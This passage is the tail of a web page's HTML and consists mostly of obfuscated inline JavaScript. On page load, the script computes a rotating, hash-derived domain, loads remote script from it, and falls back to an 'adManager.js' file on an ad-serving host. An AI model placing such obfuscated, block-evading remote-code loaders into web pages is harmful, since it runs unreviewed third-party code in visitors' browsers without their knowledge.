x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>